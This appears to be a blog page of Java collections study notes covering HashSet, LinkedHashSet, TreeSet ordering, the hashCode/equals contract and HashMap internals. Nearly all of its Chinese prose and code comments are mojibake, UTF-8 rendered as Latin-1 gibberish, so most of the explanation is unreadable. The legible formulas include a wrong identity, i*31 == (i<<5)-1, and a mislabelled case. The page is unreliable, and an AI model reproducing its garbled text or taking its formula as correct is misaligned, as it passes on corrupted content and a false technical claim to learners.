<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¸€ã€Set:å­˜å‚¨æ— åºçš„ã€ä¸å¯é‡å¤çš„æ•°æ®</span></span><br><span class="line"><span class="comment">     *      1.æ— åºæ€§ï¼šä¸ç­‰äºéšæœºæ€§ã€‚å­˜å‚¨çš„æ•°æ®åœ¨åº•å±‚æ•°ç»„ä¸­å¹¶éæŒ‰ç…§æ•°ç»„ç´¢å¼•çš„é¡ºåºæ·»åŠ ï¼Œè€Œæ˜¯æ ¹æ®æ•°æ®çš„å“ˆå¸Œå€¼å†³å®šçš„ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *      2.ä¸å¯é‡å¤æ€§ï¼šä¿è¯æ·»åŠ çš„å…ƒç´ æŒ‰ç…§equals()åˆ¤æ–­æ—¶ï¼Œä¸èƒ½è¿”å›true.å³ï¼šç›¸åŒçš„å…ƒç´ åªèƒ½æ·»åŠ ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * äºŒã€æ·»åŠ å…ƒç´ çš„è¿‡ç¨‹ï¼šä»¥HashSetä¸ºä¾‹ï¼š</span></span><br><span class="line"><span class="comment">     *      æˆ‘ä»¬å‘HashSetä¸­æ·»åŠ å…ƒç´ a,é¦–å…ˆè°ƒç”¨å…ƒç´ aæ‰€åœ¨ç±»çš„hashCode()æ–¹æ³•ï¼Œè®¡ç®—å…ƒç´ açš„å“ˆå¸Œå€¼ï¼Œ</span></span><br><span class="line"><span class="comment">     *      æ­¤å“ˆå¸Œå€¼æ¥ç€é€šè¿‡æŸç§ç®—æ³•è®¡ç®—å‡ºåœ¨HashSetåº•å±‚æ•°ç»„ä¸­çš„å­˜æ”¾ä½ç½®ï¼ˆå³ä¸ºï¼šç´¢å¼•ä½ç½®ï¼‰ï¼Œåˆ¤æ–­</span></span><br><span class="line"><span class="comment">     *      æ•°ç»„æ­¤ä½ç½®ä¸Šæ˜¯å¦å·²ç»æœ‰å…ƒç´ ï¼š</span></span><br><span class="line"><span class="comment">     *          å¦‚æœæ­¤ä½ç½®ä¸Šæ²¡æœ‰å…¶ä»–å…ƒç´ ï¼Œåˆ™å…ƒç´ aæ·»åŠ æˆåŠŸã€‚ ---&gt;æƒ…å†µ1</span></span><br><span class="line"><span class="comment">     *          å¦‚æœæ­¤ä½ç½®ä¸Šæœ‰å…¶ä»–å…ƒç´ b(æˆ–ä»¥é“¾è¡¨å½¢å¼å­˜åœ¨çš„å¤šä¸ªå…ƒç´ ï¼‰ï¼Œåˆ™æ¯”è¾ƒå…ƒç´ aä¸å…ƒç´ bçš„hashå€¼ï¼š</span></span><br><span class="line"><span class="comment">     *              å¦‚æœhashå€¼ä¸ç›¸åŒï¼Œåˆ™å…ƒç´ aæ·»åŠ æˆåŠŸã€‚---&gt;æƒ…å†µ2</span></span><br><span class="line"><span class="comment">     *              å¦‚æœhashå€¼ç›¸åŒï¼Œè¿›è€Œéœ€è¦è°ƒç”¨å…ƒç´ aæ‰€åœ¨ç±»çš„equals()æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment">     *                    equals()è¿”å›true,å…ƒç´ aæ·»åŠ å¤±è´¥</span></span><br><span class="line"><span class="comment">     *                    equals()è¿”å›false,åˆ™å…ƒç´ aæ·»åŠ æˆåŠŸã€‚---&gt;æƒ…å†µ2</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *      å¯¹äºæ·»åŠ æˆåŠŸçš„æƒ…å†µ2å’Œæƒ…å†µ3è€Œè¨€ï¼šå…ƒç´ a ä¸å·²ç»å­˜åœ¨æŒ‡å®šç´¢å¼•ä½ç½®ä¸Šæ•°æ®ä»¥é“¾è¡¨çš„æ–¹å¼å­˜å‚¨ã€‚</span></span><br><span class="line"><span class="comment">     *      jdk 7 :å…ƒç´ aæ”¾åˆ°æ•°ç»„ä¸­ï¼ŒæŒ‡å‘åŸæ¥çš„å…ƒç´ ã€‚</span></span><br><span class="line"><span class="comment">     *      jdk 8 :åŸæ¥çš„å…ƒç´ åœ¨æ•°ç»„ä¸­ï¼ŒæŒ‡å‘å…ƒç´ a</span></span><br><span class="line"><span class="comment">     *      æ€»ç»“ï¼šä¸ƒä¸Šå…«ä¸‹</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * HashSetåº•å±‚ï¼šæ•°ç»„+é“¾è¡¨çš„ç»“æ„ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/4c965e78676367af02bdc233fcd4e21a--3bb8--image-20240926154223158.png" alt="image-20240926154223158"></p>
<p>åº•å±‚ä¹Ÿæ˜¯æ•°ç»„ï¼Œåˆå§‹å®¹é‡ä¸º16ï¼Œå½“å¦‚æœä½¿ç”¨ç‡è¶…è¿‡0.75ï¼Œï¼ˆ16*0.75&#x3D;12ï¼‰å°±ä¼šæ‰©å¤§å®¹é‡ä¸ºåŸæ¥çš„2å€ã€‚ï¼ˆ16æ‰©å®¹ä¸º32ï¼Œä¾æ¬¡ä¸º64,128â€¦.ç­‰ï¼‰</p>
<h4 id="å…³äºhashCode-å’Œequals-çš„é‡å†™"><a href="#å…³äºhashCode-å’Œequals-çš„é‡å†™" class="headerlink" title="å…³äºhashCode()å’Œequals()çš„é‡å†™"></a>å…³äºhashCode()å’Œequals()çš„é‡å†™</h4><h5 id="é‡å†™hashCode-æ–¹æ³•çš„åŸºæœ¬åŸåˆ™"><a href="#é‡å†™hashCode-æ–¹æ³•çš„åŸºæœ¬åŸåˆ™" class="headerlink" title="é‡å†™hashCode() æ–¹æ³•çš„åŸºæœ¬åŸåˆ™"></a>é‡å†™hashCode() æ–¹æ³•çš„åŸºæœ¬åŸåˆ™</h5><ul>
<li>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼ŒåŒä¸€ä¸ªå¯¹è±¡å¤šæ¬¡è°ƒç”¨hashCode() æ–¹æ³•åº”è¯¥è¿”å›ç›¸åŒçš„å€¼ã€‚</li>
<li>å½“ä¸¤ä¸ªå¯¹è±¡çš„equals() æ–¹æ³•æ¯”è¾ƒè¿”å›true æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„hashCode() æ–¹æ³•çš„è¿”å›å€¼ä¹Ÿåº”ç›¸ç­‰ã€‚</li>
<li>å¯¹è±¡ä¸­ç”¨ä½œequals() æ–¹æ³•æ¯”è¾ƒçš„Fieldï¼Œéƒ½åº”è¯¥ç”¨æ¥è®¡ç®—hashCode å€¼ã€‚</li>
</ul>
<h5 id="é‡å†™equals-æ–¹æ³•çš„åŸºæœ¬åŸåˆ™"><a href="#é‡å†™equals-æ–¹æ³•çš„åŸºæœ¬åŸåˆ™" class="headerlink" title="é‡å†™equals() æ–¹æ³•çš„åŸºæœ¬åŸåˆ™"></a>é‡å†™equals() æ–¹æ³•çš„åŸºæœ¬åŸåˆ™</h5><blockquote>
<p>ä»¥è‡ªå®šä¹‰çš„Customerç±»ä¸ºä¾‹ï¼Œä½•æ—¶éœ€è¦é‡å†™equals()ï¼Ÿ</p>
</blockquote>
<ul>
<li>å½“ä¸€ä¸ªç±»æœ‰è‡ªå·±ç‰¹æœ‰çš„â€œé€»è¾‘ç›¸ç­‰â€æ¦‚å¿µ,å½“æ”¹å†™equals()çš„æ—¶å€™ï¼Œæ€»æ˜¯è¦æ”¹å†™hashCode()ï¼Œæ ¹æ®ä¸€ä¸ªç±»çš„equalsæ–¹æ³•ï¼ˆæ”¹å†™åï¼‰ï¼Œä¸¤ä¸ªæˆªç„¶ä¸åŒçš„å®ä¾‹æœ‰å¯èƒ½åœ¨é€»è¾‘ä¸Šæ˜¯ç›¸ç­‰çš„ï¼Œä½†æ˜¯ï¼Œæ ¹æ®Object.hashCode()æ–¹æ³•ï¼Œå®ƒä»¬ä»…ä»…æ˜¯ä¸¤ä¸ªå¯¹è±¡ã€‚</li>
<li>å› æ­¤ï¼Œè¿åäº†â€œ<strong>ç›¸ç­‰çš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸ç­‰çš„æ•£åˆ—ç </strong>â€ã€‚</li>
<li>ç»“è®ºï¼šå¤å†™equalsæ–¹æ³•çš„æ—¶å€™ä¸€èˆ¬éƒ½éœ€è¦åŒæ—¶å¤å†™hashCodeæ–¹æ³•ã€‚é€šå¸¸å‚ä¸è®¡ç®—hashCodeçš„å¯¹è±¡çš„å±æ€§ä¹Ÿåº”è¯¥å‚ä¸åˆ°equals()ä¸­è¿›è¡Œè®¡ç®—ã€‚</li>
</ul>
<h5 id="Eclipse-IDEAå·¥å…·é‡ŒhashCode-çš„é‡å†™"><a href="#Eclipse-IDEAå·¥å…·é‡ŒhashCode-çš„é‡å†™" class="headerlink" title="Eclipse&#x2F;IDEAå·¥å…·é‡ŒhashCode()çš„é‡å†™"></a>Eclipse&#x2F;IDEAå·¥å…·é‡ŒhashCode()çš„é‡å†™</h5><blockquote>
<p>ä»¥Eclipse&#x2F;IDEAä¸ºä¾‹ï¼Œåœ¨è‡ªå®šä¹‰ç±»ä¸­å¯ä»¥è°ƒç”¨å·¥å…·è‡ªåŠ¨é‡å†™equalså’ŒhashCodeã€‚é—®é¢˜ï¼šä¸ºä»€ä¹ˆç”¨Eclipse&#x2F;IDEAå¤å†™hashCodeæ–¹æ³•ï¼Œæœ‰31è¿™ä¸ªæ•°å­—ï¼Ÿ</p>
</blockquote>
<ul>
<li>é€‰æ‹©ç³»æ•°çš„æ—¶å€™è¦é€‰æ‹©å°½é‡å¤§çš„ç³»æ•°ã€‚å› ä¸ºå¦‚æœè®¡ç®—å‡ºæ¥çš„hashåœ°å€è¶Šå¤§ï¼Œæ‰€è°“çš„â€œå†²çªâ€å°±è¶Šå°‘ï¼ŒæŸ¥æ‰¾èµ·æ¥æ•ˆç‡ä¹Ÿä¼šæé«˜ã€‚ï¼ˆå‡å°‘å†²çªï¼‰</li>
<li>å¹¶ä¸”31åªå ç”¨5bits,ç›¸ä¹˜é€ æˆæ•°æ®æº¢å‡ºçš„æ¦‚ç‡è¾ƒå°ã€‚</li>
<li>31å¯ä»¥ç”±i*31&#x3D;&#x3D; (i&lt;&lt;5)-1æ¥è¡¨ç¤º,ç°åœ¨å¾ˆå¤šè™šæ‹Ÿæœºé‡Œé¢éƒ½æœ‰åšç›¸å…³ä¼˜åŒ–ã€‚ï¼ˆæé«˜ç®—æ³•æ•ˆç‡ï¼‰</li>
<li>31æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œç´ æ•°ä½œç”¨å°±æ˜¯å¦‚æœæˆ‘ç”¨ä¸€ä¸ªæ•°å­—æ¥ä¹˜ä»¥è¿™ä¸ªç´ æ•°ï¼Œé‚£ä¹ˆæœ€ç»ˆå‡ºæ¥çš„ç»“æœåªèƒ½è¢«ç´ æ•°æœ¬èº«å’Œè¢«ä¹˜æ•°è¿˜æœ‰1æ¥æ•´é™¤ï¼(å‡å°‘å†²çª)</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 2.è¦æ±‚ï¼šå‘Set(ä¸»è¦æŒ‡ï¼šHashSetã€LinkedHashSet)ä¸­æ·»åŠ çš„æ•°æ®ï¼Œå…¶æ‰€åœ¨çš„ç±»ä¸€å®šè¦é‡å†™hashCode()å’Œequals()</span></span><br><span class="line"><span class="comment">  *   è¦æ±‚ï¼šé‡å†™çš„hashCode()å’Œequals()å°½å¯èƒ½ä¿æŒä¸€è‡´æ€§ï¼šç›¸ç­‰çš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸ç­‰çš„æ•£åˆ—ç </span></span><br><span class="line"><span class="comment">  *        é‡å†™ä¸¤ä¸ªæ–¹æ³•çš„å°æŠ€å·§ï¼šå¯¹è±¡ä¸­ç”¨ä½œ equals() æ–¹æ³•æ¯”è¾ƒçš„ Fieldï¼Œéƒ½åº”è¯¥ç”¨æ¥è®¡ç®— hashCode å€¼ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="LinkedHashSetçš„ä½¿ç”¨"><a href="#LinkedHashSetçš„ä½¿ç”¨" class="headerlink" title="LinkedHashSetçš„ä½¿ç”¨"></a>LinkedHashSetçš„ä½¿ç”¨</h4><ul>
<li>LinkedHashSetæ˜¯HashSetçš„å­ç±»</li>
<li>LinkedHashSetæ ¹æ®å…ƒç´ çš„hashCodeå€¼æ¥å†³å®šå…ƒç´ çš„å­˜å‚¨ä½ç½®ï¼Œä½†å®ƒåŒæ—¶ä½¿ç”¨åŒå‘é“¾è¡¨ç»´æŠ¤å…ƒç´ çš„æ¬¡åºï¼Œè¿™ä½¿å¾—å…ƒç´ çœ‹èµ·æ¥æ˜¯ä»¥<strong>æ’å…¥é¡ºåºä¿å­˜</strong>çš„ã€‚</li>
<li><strong>LinkedHashSetæ’å…¥æ€§èƒ½ç•¥ä½äºHashSet</strong>ï¼Œä½†åœ¨è¿­ä»£è®¿é—®Set é‡Œçš„å…¨éƒ¨å…ƒç´ æ—¶æœ‰å¾ˆå¥½çš„æ€§èƒ½ã€‚</li>
<li>LinkedHashSetä¸å…è®¸é›†åˆå…ƒç´ é‡å¤ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/4cc23d898e14d8003b0ae66094b41ed2--e610--image-20240926154251866.png" alt="image-20240926154251866"></p>
<h4 id="TreeSetçš„è‡ªç„¶æ’åº"><a href="#TreeSetçš„è‡ªç„¶æ’åº" class="headerlink" title="TreeSetçš„è‡ªç„¶æ’åº"></a>TreeSetçš„è‡ªç„¶æ’åº</h4><ul>
<li><p>TreeSetæ˜¯SortedSetæ¥å£çš„å®ç°ç±»ï¼ŒTreeSetå¯ä»¥ç¡®ä¿é›†åˆå…ƒç´ å¤„äºæ’åºçŠ¶æ€ã€‚</p>
</li>
<li><p>TreeSetåº•å±‚ä½¿ç”¨<strong>çº¢é»‘æ ‘</strong>ç»“æ„å­˜å‚¨æ•°æ®</p>
</li>
<li><p>æ–°å¢çš„æ–¹æ³•å¦‚ä¸‹ï¼š(äº†è§£)</p>
<ul>
<li>Comparator comparator()</li>
<li>Object first()</li>
<li>Object last()</li>
<li>Object lower(Object e)</li>
<li>Object higher(Object e)</li>
<li>SortedSet subSet(fromElement, toElement)</li>
<li>SortedSet headSet(toElement)</li>
<li>SortedSet tailSet(fromElement)</li>
</ul>
</li>
<li><p>TreeSetä¸¤ç§æ’åºæ–¹æ³•ï¼š<strong>è‡ªç„¶æ’åºå’Œå®šåˆ¶æ’åº</strong>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒTreeSeté‡‡ç”¨è‡ªç„¶æ’åºã€‚</p>
</li>
<li><p>TreeSetå’Œåé¢è¦è®²çš„TreeMapé‡‡ç”¨çº¢é»‘æ ‘çš„å­˜å‚¨ç»“æ„</p>
</li>
<li><p>ç‰¹ç‚¹ï¼šæœ‰åºï¼ŒæŸ¥è¯¢é€Ÿåº¦æ¯”Listå¿«</p>
</li>
</ul>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/72532b7ff7aafd3013078e556dcd5789--c2f7--image-20240926155705628.png" alt="image-20240926155705628"></p>
<ul>
<li><p>è‡ªç„¶æ’åºï¼šTreeSetä¼šè°ƒç”¨é›†åˆå…ƒç´ çš„compareTo(Object obj) æ–¹æ³•æ¥æ¯”è¾ƒå…ƒç´ ä¹‹é—´çš„å¤§å°å…³ç³»ï¼Œç„¶åå°†é›†åˆå…ƒç´ æŒ‰å‡åº(é»˜è®¤æƒ…å†µ)æ’åˆ—ã€‚</p>
</li>
<li><p><strong>å¦‚æœè¯•å›¾æŠŠä¸€ä¸ªå¯¹è±¡æ·»åŠ åˆ°TreeSetæ—¶ï¼Œåˆ™è¯¥å¯¹è±¡çš„ç±»å¿…é¡»å®ç°Comparable æ¥å£</strong>ã€‚</p>
<ul>
<li>å®ç°Comparable çš„ç±»å¿…é¡»å®ç°compareTo(Object obj) æ–¹æ³•ï¼Œä¸¤ä¸ªå¯¹è±¡å³é€šè¿‡compareTo(Object obj) æ–¹æ³•çš„è¿”å›å€¼æ¥æ¯”è¾ƒå¤§å°ã€‚</li>
</ul>
</li>
<li><p>Comparable çš„å…¸å‹å®ç°ï¼š</p>
<ul>
<li>BigDecimalã€BigInteger ä»¥åŠæ‰€æœ‰çš„æ•°å€¼å‹å¯¹åº”çš„åŒ…è£…ç±»ï¼šæŒ‰å®ƒä»¬å¯¹åº”çš„æ•°å€¼å¤§å°è¿›è¡Œæ¯”è¾ƒ</li>
<li>Characterï¼šæŒ‰å­—ç¬¦çš„unicodeå€¼æ¥è¿›è¡Œæ¯”è¾ƒ</li>
<li>Booleanï¼štrue å¯¹åº”çš„åŒ…è£…ç±»å®ä¾‹å¤§äºfalse å¯¹åº”çš„åŒ…è£…ç±»å®ä¾‹</li>
<li>Stringï¼šæŒ‰å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„unicode å€¼è¿›è¡Œæ¯”è¾ƒ</li>
<li>Dateã€Timeï¼šåè¾¹çš„æ—¶é—´ã€æ—¥æœŸæ¯”å‰é¢çš„æ—¶é—´ã€æ—¥æœŸå¤§</li>
</ul>
</li>
<li><p>å‘TreeSetä¸­æ·»åŠ å…ƒç´ æ—¶ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªå…ƒç´ æ— é¡»æ¯”è¾ƒcompareTo()æ–¹æ³•ï¼Œåé¢æ·»åŠ çš„æ‰€æœ‰å…ƒç´ éƒ½ä¼šè°ƒç”¨compareTo()æ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚</p>
</li>
<li><p><strong>å› ä¸ºåªæœ‰ç›¸åŒç±»çš„ä¸¤ä¸ªå®ä¾‹æ‰ä¼šæ¯”è¾ƒå¤§å°ï¼Œæ‰€ä»¥å‘TreeSetä¸­æ·»åŠ çš„åº”è¯¥æ˜¯åŒä¸€ä¸ªç±»çš„å¯¹è±¡</strong>ã€‚</p>
</li>
<li><p>å¯¹äºTreeSeté›†åˆè€Œè¨€ï¼Œå®ƒ<strong>åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰çš„å”¯ä¸€æ ‡å‡†</strong>æ˜¯ï¼šä¸¤ä¸ªå¯¹è±¡é€šè¿‡compareTo(Object obj) æ–¹æ³•æ¯”è¾ƒè¿”å›å€¼ã€‚</p>
</li>
<li><p>å½“éœ€è¦æŠŠä¸€ä¸ªå¯¹è±¡æ”¾å…¥TreeSetä¸­ï¼Œé‡å†™è¯¥å¯¹è±¡å¯¹åº”çš„equals() æ–¹æ³•æ—¶ï¼Œåº”ä¿è¯è¯¥æ–¹æ³•ä¸compareTo(Object obj) æ–¹æ³•æœ‰ä¸€è‡´çš„ç»“æœï¼šå¦‚æœä¸¤ä¸ªå¯¹è±¡é€šè¿‡equals() æ–¹æ³•æ¯”è¾ƒè¿”å›trueï¼Œåˆ™é€šè¿‡compareTo(Object obj) æ–¹æ³•æ¯”è¾ƒåº”è¿”å›0ã€‚å¦åˆ™ï¼Œè®©äººéš¾ä»¥ç†è§£ã€‚</p>
</li>
</ul>
<h4 id="TreeSetçš„å®šåˆ¶æ’åº"><a href="#TreeSetçš„å®šåˆ¶æ’åº" class="headerlink" title="TreeSetçš„å®šåˆ¶æ’åº"></a>TreeSetçš„å®šåˆ¶æ’åº</h4><ul>
<li>TreeSetçš„è‡ªç„¶æ’åºè¦æ±‚å…ƒç´ æ‰€å±çš„ç±»å®ç°Comparableæ¥å£ï¼Œå¦‚æœå…ƒç´ æ‰€å±çš„ç±»æ²¡æœ‰å®ç°Comparableæ¥å£ï¼Œæˆ–ä¸å¸Œæœ›æŒ‰ç…§å‡åº(é»˜è®¤æƒ…å†µ)çš„æ–¹å¼æ’åˆ—å…ƒç´ æˆ–å¸Œæœ›æŒ‰ç…§å…¶å®ƒå±æ€§å¤§å°è¿›è¡Œæ’åºï¼Œåˆ™è€ƒè™‘ä½¿ç”¨å®šåˆ¶æ’åºã€‚å®šåˆ¶æ’åºï¼Œé€šè¿‡Comparatoræ¥å£æ¥å®ç°ã€‚éœ€è¦é‡å†™compare(T o1,T o2)æ–¹æ³•ã€‚</li>
<li>åˆ©ç”¨int compare(T o1,T o2)æ–¹æ³•ï¼Œæ¯”è¾ƒo1å’Œo2çš„å¤§å°ï¼šå¦‚æœæ–¹æ³•è¿”å›æ­£æ•´æ•°ï¼Œåˆ™è¡¨ç¤ºo1å¤§äºo2ï¼›å¦‚æœè¿”å›0ï¼Œè¡¨ç¤ºç›¸ç­‰ï¼›è¿”å›è´Ÿæ•´æ•°ï¼Œè¡¨ç¤ºo1å°äºo2ã€‚</li>
<li>è¦å®ç°å®šåˆ¶æ’åºï¼Œéœ€è¦å°†å®ç°Comparatoræ¥å£çš„å®ä¾‹ä½œä¸ºå½¢å‚ä¼ é€’ç»™TreeSetçš„æ„é€ å™¨ã€‚</li>
<li>æ­¤æ—¶ï¼Œä»ç„¶åªèƒ½å‘TreeSetä¸­æ·»åŠ ç±»å‹ç›¸åŒçš„å¯¹è±¡ã€‚å¦åˆ™å‘ç”ŸClassCastExceptionå¼‚å¸¸ã€‚</li>
<li>ä½¿ç”¨å®šåˆ¶æ’åºåˆ¤æ–­ä¸¤ä¸ªå…ƒç´ ç›¸ç­‰çš„æ ‡å‡†æ˜¯ï¼šé€šè¿‡Comparatoræ¯”è¾ƒä¸¤ä¸ªå…ƒç´ è¿”å›äº†0ã€‚</li>
</ul>
<h3 id="6ã€Mapæ¥å£"><a href="#6ã€Mapæ¥å£" class="headerlink" title="6ã€Mapæ¥å£"></a>6ã€Mapæ¥å£</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/016b16f866b8814053813f34ef5ecd04--3ebe--image-20240926160356106.png" alt="image-20240926160356106"></p>
<h4 id="Mapä¸­å­˜å‚¨çš„key-valueçš„ç‰¹ç‚¹"><a href="#Mapä¸­å­˜å‚¨çš„key-valueçš„ç‰¹ç‚¹" class="headerlink" title="Mapä¸­å­˜å‚¨çš„key-valueçš„ç‰¹ç‚¹"></a>Mapä¸­å­˜å‚¨çš„key-valueçš„ç‰¹ç‚¹</h4><ul>
<li>Mapä¸Collectionå¹¶åˆ—å­˜åœ¨ã€‚ç”¨äºä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„æ•°æ®:key-value</li>
<li>Map ä¸­çš„key å’Œvalue éƒ½å¯ä»¥æ˜¯ä»»ä½•å¼•ç”¨ç±»å‹çš„æ•°æ®</li>
<li>Map ä¸­çš„key ç”¨Setæ¥å­˜æ”¾ï¼Œä¸å…è®¸é‡å¤ï¼Œå³åŒä¸€ä¸ªMap å¯¹è±¡æ‰€å¯¹åº”çš„ç±»ï¼Œé¡»é‡å†™hashCode()å’Œequals()æ–¹æ³•</li>
<li>å¸¸ç”¨Stringç±»ä½œä¸ºMapçš„â€œé”®â€</li>
<li>key å’Œvalue ä¹‹é—´å­˜åœ¨å•å‘ä¸€å¯¹ä¸€å…³ç³»ï¼Œå³é€šè¿‡æŒ‡å®šçš„key æ€»èƒ½æ‰¾åˆ°å”¯ä¸€çš„ã€ç¡®å®šçš„value</li>
<li>Mapæ¥å£çš„å¸¸ç”¨å®ç°ç±»ï¼šHashMapã€TreeMapã€LinkedHashMapå’ŒPropertiesã€‚å…¶ä¸­ï¼ŒHashMapæ˜¯Map æ¥å£ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„å®ç°ç±»</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/5c6b47f892f9a5a48d33dfd7eac19e22--580b--image-20240926160454945.png" alt="image-20240926160454945"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  *  äºŒã€Mapç»“æ„çš„ç†è§£ï¼š</span></span><br><span class="line"><span class="comment">  *    Mapä¸­çš„key:æ— åºçš„ã€ä¸å¯é‡å¤çš„ï¼Œä½¿ç”¨Setå­˜å‚¨æ‰€æœ‰çš„key  ---&gt; keyæ‰€åœ¨çš„ç±»è¦é‡å†™equals()å’ŒhashCode() ï¼ˆä»¥HashMapä¸ºä¾‹ï¼‰</span></span><br><span class="line"><span class="comment">  *    Mapä¸­çš„value:æ— åºçš„ã€å¯é‡å¤çš„ï¼Œä½¿ç”¨Collectionå­˜å‚¨æ‰€æœ‰çš„value ---&gt;valueæ‰€åœ¨çš„ç±»è¦é‡å†™equals()</span></span><br><span class="line"><span class="comment">  *    ä¸€ä¸ªé”®å€¼å¯¹ï¼škey-valueæ„æˆäº†ä¸€ä¸ªEntryå¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment">  *    Mapä¸­çš„entry:æ— åºçš„ã€ä¸å¯é‡å¤çš„ï¼Œä½¿ç”¨Setå­˜å‚¨æ‰€æœ‰çš„entry</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  */</span>   </span><br></pre></td></tr></table></figure>

<h4 id="Mapå®ç°ç±»ä¹‹ä¸€ï¼šHashMap"><a href="#Mapå®ç°ç±»ä¹‹ä¸€ï¼šHashMap" class="headerlink" title="Mapå®ç°ç±»ä¹‹ä¸€ï¼šHashMap"></a>Mapå®ç°ç±»ä¹‹ä¸€ï¼šHashMap</h4><ul>
<li><strong>HashMapæ˜¯Map æ¥å£ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„å®ç°ç±»</strong>ã€‚</li>
<li>å…è®¸ä½¿ç”¨nullé”®å’Œnullå€¼ï¼Œä¸HashSetä¸€æ ·ï¼Œä¸ä¿è¯æ˜ å°„çš„é¡ºåºã€‚</li>
<li>æ‰€æœ‰çš„keyæ„æˆçš„é›†åˆæ˜¯Set:æ— åºçš„ã€ä¸å¯é‡å¤çš„ã€‚æ‰€ä»¥ï¼Œkeyæ‰€åœ¨çš„ç±»è¦é‡å†™ï¼šequals()å’ŒhashCode()</li>
<li>æ‰€æœ‰çš„valueæ„æˆçš„é›†åˆæ˜¯Collection:æ— åºçš„ã€å¯ä»¥é‡å¤çš„ã€‚æ‰€ä»¥ï¼Œvalueæ‰€åœ¨çš„ç±»è¦é‡å†™ï¼šequals()</li>
<li>ä¸€ä¸ªkey-valueæ„æˆä¸€ä¸ªentry</li>
<li>æ‰€æœ‰çš„entryæ„æˆçš„é›†åˆæ˜¯Set:æ— åºçš„ã€ä¸å¯é‡å¤çš„</li>
<li>HashMap åˆ¤æ–­ä¸¤ä¸ªkey ç›¸ç­‰çš„æ ‡å‡†æ˜¯ï¼šä¸¤ä¸ªkey é€šè¿‡equals() æ–¹æ³•è¿”å›trueï¼ŒhashCodeå€¼ä¹Ÿç›¸ç­‰ã€‚</li>
<li>HashMapåˆ¤æ–­ä¸¤ä¸ªvalueç›¸ç­‰çš„æ ‡å‡†æ˜¯ï¼šä¸¤ä¸ªvalue é€šè¿‡equals() æ–¹æ³•è¿”å›trueã€‚</li>
</ul>
<h4 id="HashMapçš„åº•å±‚å®ç°åŸç†"><a href="#HashMapçš„åº•å±‚å®ç°åŸç†" class="headerlink" title="HashMapçš„åº•å±‚å®ç°åŸç†"></a>HashMapçš„åº•å±‚å®ç°åŸç†</h4><blockquote>
<p>JDK 7åŠä»¥å‰ç‰ˆæœ¬ï¼šHashMapæ˜¯æ•°ç»„+é“¾è¡¨ç»“æ„(å³ä¸ºé“¾åœ°å€æ³•)</p>
<p>JDK 8ç‰ˆæœ¬å‘å¸ƒä»¥åï¼šHashMapæ˜¯æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘å®ç°ã€‚</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/ec2168962e0afd8308af7a84307e36c3--d616--image-20240926161011409.png" alt="image-20240926161011409"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/f366179f78492670947d2f3c225434b1--5796--image-20240926161016501.png" alt="image-20240926161016501"></p>
<ul>
<li>HashMapæºç ä¸­çš„é‡è¦å¸¸é‡</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      DEFAULT_INITIAL_CAPACITY : HashMapçš„é»˜è®¤å®¹é‡ï¼Œ16</span></span><br><span class="line"><span class="comment"> *      DEFAULT_LOAD_FACTORï¼šHashMapçš„é»˜è®¤åŠ è½½å› å­ï¼š0.75</span></span><br><span class="line"><span class="comment"> *      thresholdï¼šæ‰©å®¹çš„ä¸´ç•Œå€¼ï¼Œ=å®¹é‡*å¡«å……å› å­ï¼š16 * 0.75 =&gt; 12</span></span><br><span class="line"><span class="comment"> *      TREEIFY_THRESHOLDï¼šBucketä¸­é“¾è¡¨é•¿åº¦å¤§äºè¯¥é»˜è®¤å€¼ï¼Œè½¬åŒ–ä¸ºçº¢é»‘æ ‘:8</span></span><br><span class="line"><span class="comment"> *      MIN_TREEIFY_CAPACITYï¼šæ¡¶ä¸­çš„Nodeè¢«æ ‘åŒ–æ—¶æœ€å°çš„hashè¡¨å®¹é‡:64</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

